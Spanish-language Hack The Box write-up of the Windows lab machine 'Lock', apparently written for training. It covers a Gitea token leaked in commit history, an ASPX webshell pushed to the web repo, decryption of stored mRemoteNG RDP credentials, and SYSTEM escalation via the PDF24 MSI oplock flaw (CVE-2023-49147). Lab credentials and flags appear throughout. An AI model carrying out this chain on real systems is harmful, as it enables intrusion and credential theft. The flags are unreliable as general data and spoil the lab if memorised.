---
title: Lock
date: 2025-11-28 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, lock ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/6ff0909c785b152b35bcc80475fcac67.png
    alt: Hack The Box
---

> Lock
Windows · Easy 

## Task 1
How many open TCP ports are listening on Lock?

``` shell
                                                                                                                                         
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- 10.129.25.203 -sC -sV -T 5 -vv 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 21:59 CET
Initiating SYN Stealth Scan at 22:00
Scanning 10.129.25.203 [65535 ports]
Discovered open port 445/tcp on 10.129.25.203
Discovered open port 80/tcp on 10.129.25.203
Discovered open port 3389/tcp on 10.129.25.203
SYN Stealth Scan Timing: About 20.06% done; ETC: 22:02 (0:02:04 remaining)
Discovered open port 3000/tcp on 10.129.25.203
SYN Stealth Scan Timing: About 63.30% done; ETC: 22:01 (0:00:35 remaining)
Completed SYN Stealth Scan at 22:01, 94.22s elapsed (65535 total ports)
Initiating Service scan at 22:01
Scanning 4 services on 10.129.25.203
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 22:02, 28.15s elapsed (4 services on 1 host)
Initiating NSE at 22:02
Completed NSE at 22:02, 0.02s elapsed
Nmap scan report for 10.129.25.203
Host is up, received echo-reply ttl 127 (0.046s latency).
Scanned at 2025-11-27 22:00:02 CET for 165s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Lock - Index
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  http          syn-ack ttl 127 Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| http-methods: 
|_  Supported Methods: HEAD GET
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=a7647e0cd0038e7e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=XPFPfm-QT7pREk4h9Xa7QiOfNF06MTc2NDI3NzMwMzUzOTQzMTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 27 Nov 2025 21:01:44 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a5adfa8e7c40686b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=A9eKGqulTa83M-bsAfjDz62S12c6MTc2NDI3NzMwNDM5Njk5MTAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 27 Nov 2025 21:01:44 GMT
|_    Content-Length: 0
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-11-27T21:02:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Issuer: commonName=Lock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-26T20:46:55
| Not valid after:  2026-05-28T20:46:55
| MD5:   4a91:9a56:8897:c0fd:5cd1:176e:a149:1d42
| SHA-1: 09cc:86a9:de06:3e25:f8a7:bfb7:bf1d:2de5:b375:5b29
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQaY3+ws+1iqlFC5rhnbDAlzANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRMb2NrMB4XDTI1MTEyNjIwNDY1NVoXDTI2MDUyODIwNDY1NVow
| DzENMAsGA1UEAxMETG9jazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ANUGaBr2xJAP+n1IohqGkFzzE3/RRswhUtdKmwWPvrEvBb9F+HNbZ9mQF2cze6MG
| umMxBG4uWF9s3RYL8MtwkxV40lJ026/5hIPCHC/rMv6G/iibRs968ZX/56ArawJ8
| j9HXUKurbWJL2Bc/R7DCnQJ3JRk1VC5zPML3ctt8vNBklngxcHZMSE8c+Elryfyk
| f5NK78ifR8xn9CXWXr+RwcmhgMkDChfiADMFvkznA0ZXgF5tAwygfseYmVRClDel
| psY0j65E0GqPLpVBE2nSsIFnSomZLyItZf8tQdwTRRK3r8+9SxY7WeVSXRKSTTzK
| SmFz9nlc7IUugcuN0EmwARECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQCLcQwjZOLOxfdbTmiBPhYM
| tebomly69y5yLBxGyIoOxth64GqS6nfpJMneeCtaG73Whz7+4gon7qdSFKG1cGWS
| RhlRP/qD5ERVQagV2LNtgjuzqvuCmecBQcz/SimsOGskFQtdreBotFNAxUHCAf8X
| 8EX4GEIjFixc7HEHmPqbhtvOWJlbusGN1wQPMVpR5PNhV6gEi2m/ajT+qeh59GsH
| GcmdUF5Qh77M0ZeaHvbCzMH41i4knt2zQsI4qzuF+nBqwuFAKBpzloMCitk3fJ6V
| NxZnaDsQsibjTLbM1G7qHJ57vXaTZ1YC60c5DUvY0l4cczU437qacJKuuSdHurQa
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-27T21:02:06+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/27%Time=6928BC37%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
SF:=a7647e0cd0038e7e;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20_csrf=XPFPfm-QT7pREk4h9Xa7QiOfNF06MTc2NDI3NzMwMzUzOTQzMTYwMA;\x20
SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
SF:ns:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2027\x20Nov\x202025\x2021:01:44\x20
SF:GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme
SF:-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devic
SF:e-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20
SF:cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:ap
SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY
SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf
SF:dXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8
SF:vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbm
SF:ciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet
SF:-Cookie:\x20i_like_gitea=a5adfa8e7c40686b;\x20Path=/;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20_csrf=A9eKGqulTa83M-bsAfjDz62S12c6MTc2NDI
SF:3NzMwNDM5Njk5MTAwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameS
SF:ite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2027\x20Nov
SF:\x202025\x2021:01:44\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-27T21:02:07
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50504/tcp): CLEAN (Timeout)
|   Check 2 (port 25971/tcp): CLEAN (Timeout)
|   Check 3 (port 61695/udp): CLEAN (Timeout)
|   Check 4 (port 35146/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.

Nmap done: 1 IP address (1 host up) scanned in 178.56 seconds
           Raw packets sent: 131141 (5.770MB) | Rcvd: 68 (2.976KB)
```

nmap muestra 4 puertos
> 4

## Task 2
What application is listening on TCP 3000?

> Gitea

## Task 3
What is the name of the publicly accessible repository owned by ellen.freeman?

Accedemos a la URL http://10.129.25.203:3000/ellen.freeman/dev-scripts

> dev-scripts

## Task 4
What is the value of a personal access token that is still valid on this instance of Gitea?

http://10.129.25.203:3000/ellen.freeman/dev-scripts/commit/8b78e6c3024416bce55926faa3f65421a25d6370

A la autora se le quedó un TOKEN al descubierto en un commit anterior. ``` PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f' ```

``` shell
@ -1,8 +1,6 @@
import requests
import sys
-
- # store this in env instead at some point
- PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+ import os
```

> 43ce39bb0bd6bc489284f2905f033ca467a6362f

## Task 5
What is the name of the repository accessible via the API token that wasn't available without it?

Me llevó un rato buscar en la página como usar el token pero después de un rato averigüé que podía primero darle a al boton 
``` Athorized ``` y introducir allí el token luego en el apartados repositorios y realizé la busqueda
http://10.129.25.203:3000/api/swagger#/repository/repoSearch

``` shell
curl -X 'GET' \
  'http://10.129.25.203:3000/api/v1/repos/search?token=43ce39bb0bd6bc489284f2905f033ca467a6362f&access_token=43ce39bb0bd6bc489284f2905f033ca467a6362f%20' \
  -H 'accept: application/json' \
  -H 'Authorization: 43ce39bb0bd6bc489284f2905f033ca467a6362f '
```
En el cuerpo de la respueta nos devuelve un json que incluye el proyecto dev-scripts ```"name": "website",```

El fichero http://10.129.25.203:3000/ellen.freeman/dev-scripts/src/branch/main/repos.py  ```repos.py``` que nos encontramos en el repositorio de  ```ellen.freeman```
                        
``` python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        #domain = 'https://' + domain
        domain = 'http://10.129.25.203:3000'
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    #personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    personal_access_token = "43ce39bb0bd6bc489284f2905f033ca467a6362f"
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```
Modifico el script para ejecutarlo hardcodeando el token y modificando el dominio

``` shell
┌──(pmartinezr㉿kali)-[~/htb/lock]
└─$ python repos.py a
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```
Otra forma de averiguar ```website```

> website

## Task 6
What user on Lock is the Gitea application running as?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ git clone http://10.129.25.203:3000/ellen.freeman/website
Cloning into 'website'...
Username for 'http://10.129.25.203:3000': ellen.freeman
Password for 'http://ellen.freeman@10.129.25.203:3000': 
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 184.00 KiB/s, done.
Resolving deltas: 100% (35/35), done.
                                   
```
Depués de pensar un rato como debía proceder, se me ocurrió realizar la más obvia, clonar ese proyecto "oculto" y funcionó. Como ```Password for 'http://ellen.freeman@10.129.25.203:3000':``` usamos el token. 


``` shell
┌──(pmartinezr㉿kali)-[~/htb/lock/website]
└─$ ping 10.129.25.203 -c3
PING 10.129.25.203 (10.129.25.203) 56(84) bytes of data.
64 bytes from 10.129.25.203: icmp_seq=1 ttl=127 time=49.4 ms
64 bytes from 10.129.25.203: icmp_seq=2 ttl=127 time=40.9 ms
64 bytes from 10.129.25.203: icmp_seq=3 ttl=127 time=42.0 ms

--- 10.129.25.203 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 40.894/44.087/49.407/3.786 ms

```

Al lanzar un ping nos da a entender que el servidor es un servidor Windows

``` shell
                                                                                                                                           
┌──(pmartinezr㉿kali)-[~/htb/lock/website]
└─$ git commit -m "webshell"                   
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'pmartinezr@kali.(none)')
                                                                                                                                           
┌──(pmartinezr㉿kali)-[~/htb/lock/website]
└─$ git config --global user.email "ellen.freeman@website.com"
                                                                                                                                           
┌──(pmartinezr㉿kali)-[~/htb/lock/website]
└─$ git commit -m "webshell"                                  
[main aaa2ccf] webshell
 1 file changed, 58 insertions(+)
 create mode 100644 webshell.asp
                                                                                                                                           
┌──(pmartinezr㉿kali)-[~/htb/lock/website]
└─$ git push                
Username for 'http://10.129.25.203:3000': ellen.freeman
Password for 'http://ellen.freeman@10.129.25.203:3000': 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 906 bytes | 906.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.25.203:3000/ellen.freeman/website
   73cdcc1..aaa2ccf  main -> main
```
Así que intento subir una shell, para la autenticación usamos el usuario ellen.freeman y el token como password de nuevo

La webshell para que me valí inicialmente está en este enlace [https://gist.github.com/dttlcysec/3eb65c704f71eab7d9536632fbd6fabd](https://gist.github.com/dttlcysec/3eb65c704f71eab7d9536632fbd6fabd). Al archivo lo llamé webshell.aspx


``` html
USER INFORMATION
----------------

User Name          SID                                           
================== ==============================================
lock\ellen.freeman S-1-5-21-3479006486-3698385926-2473385619-1000
```
Luego accedemos con el navegador para  utilizar la shell http://10.129.25.203:3000/webshell.aspx 
Introduzco ```whoami /user``` en el formulario Command de esta webshell

> ellen.freeman

## Task 7

What is the full path of a mRemoteNG configuration file containing stored credentials?

``` html
type c:\users\ellen.freeman\.git-credentials
```
Descubro información relevante ¿una password? ```http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000```

```
[user]
	email = ellen.freeman@oplock.vl
	name = Ellen Freeman
[safe]
	directory = C:/inetpub/wwwroot
[credential "http://localhost:3000"]
	provider = generic

```
Continuamos la exploración con la webshell

``` xml 
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

Hay que explorar todo hasta que encontré varios ficheros pero el bueno lo obtuve ejecutando lo siguiente
```type  "C:\Users\ellen.freeman\Documents\config.xml"```

> C:\Users\ellen.freeman\Documents\config.xml

## Task 8
What is the password for the user Gale.Dekarios?

Como descifro el password? ```TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="```
Encontŕe el siguiente script de Python que en teoría es capaz de hacerlo [https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/blob/main/mremoteng_decrypt.py](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/blob/main/mremoteng_decrypt.py)

```
┌──(pmartinezr㉿kali)-[~/htb/lock]
└─$ python mremoteng_decrypt.py -f hash                                    
Password: ty8wnW9qCKDosXo6

```
Al parecer este algoritmo está roto y se descifra rápido, ni siquiera hace falta un diccionario.

> ty8wnW9qCKDosXo6

## Submit User Flag

Ahora nos intentamos conectar por RDP 

``` shell
┌──(pmartinezr㉿kali)-[~/htb/lock]
└─$ rdesktop -u Gale.Dekarios -p  ty8wnW9qCKDosXo6 10.129.25.203:3389 
```

En el escritorio hay un archivo ```user``` 

> 75740e9a34bcd388ce4030c1a54f212a

## Task 10
What version of PDF24 is installed on the system?

Ahora simplmente abrimos el programa PDF24 y miramos la versión del mismo en el botón ```About PDF24 Creator```

> 11.15.1

## Task 11

What is the 2023 CVE ID for a local privilege escalation vulnerability in the MSI installer for this version of PDF24?

Hay una búsqueda en google ```PDF24 CVE 2023``` [https://nvd.nist.gov/vuln/detail/CVE-2023-49147](https://nvd.nist.gov/vuln/detail/CVE-2023-49147) 
pruebo con el CVE CVE-2023-49147

> CVE-2023-49147

## Task 12 

What is the full path to the PDF24 MSI installer used for the exploit?

Esto lo resolví simplemente abriendo el explorador de Windows y buscando PDF24

> "C:\_install\pdf24-creator-11.15.1-x64.msi"


## Submit the flag located on the Administrator user's desktop.

Al principio me costó un poco entender como usar el exploit pero es bastante sencillo
Pero aquí está explicado [https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)


### Explicación general del exploit

El escenario descrito se basa en un problema de escalada de privilegios en PDF24 Creator cuando se instala mediante el archivo MSI.

1. Reparación MSI ejecutada con privilegios elevados. Cuando un producto instalado mediante MSI se “repara”, partes del proceso pueden ejecutarse con privilegios de SYSTEM, incluso si el usuario que inicia la reparación tiene permisos bajos. Esto ocurre porque Windows considera que ciertas tareas de mantenimiento del sistema requieren privilegios altos.

2. Subproceso vulnerable.Durante esta reparación, PDF24 Creator invoca un proceso interno (pdf24-PrinterInstall.exe) que también corre como SYSTEM. Ese proceso realiza operaciones de escritura en un archivo ubicado en Program Files, un directorio protegido. Normalmente un usuario con pocos privilegios no podría influir en ese archivo.

3. Uso de un “oplock”. El exploit aprovecha un mecanismo de Windows llamado oplock (opportunistic lock).
Un oplock permite que un proceso “intercepte” el acceso a un archivo justo cuando otro proceso intenta leerlo o escribirlo.

En nuestra kali ponemos a servir el ejecutable 

```shell
┌──(pmartinezr㉿kali)-[~/htb/lock]
└─$ wget https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z
7z x Release.7z 
┌──(pmartinezr㉿kali)-[~/htb/lock]
└─$ python -m http.server 80
```

Esto lo haremos para acceder desde la máquina que queremos vulnerar y descargar el exploit con navegador o con cmd.

Seguimos las instrucciones

En un terminal ejecutamos el bloqueo del archivo ```faxPrnInst.log```

``` shell
C:\Users\gale.dekarios\Desktop>SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
OpLock triggered, hit ENTER to close oplock
``` 

Ahora en otro terminal lanzamos el reparador ```msiexec /fa```

``` shell
c:\_install>msiexec /fa c:\_install\pdf24-creator-11.15.1-x64.msi
```

Cuando se congele el instalador hacemos la acción de editar propiedades y elegir consola legacy ```Legacy console mode```,
esto hará que se abra el navegador, seguimos con las intrucciones pulsamos Ctrl + O como si fueramos a abrir un archivo, 
en el nombre del archivo ponemos cmd.exe y como tenemos el exploit activado, vemos que se abre un cmd o consola con permisos elevados

```shell 
C:\Users\Administrator\Desktop>type root
The system cannot find the file specified.

C:\Users\Administrator\Desktop>type root.txt
0d9f9431fe52c2141c************
```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/699)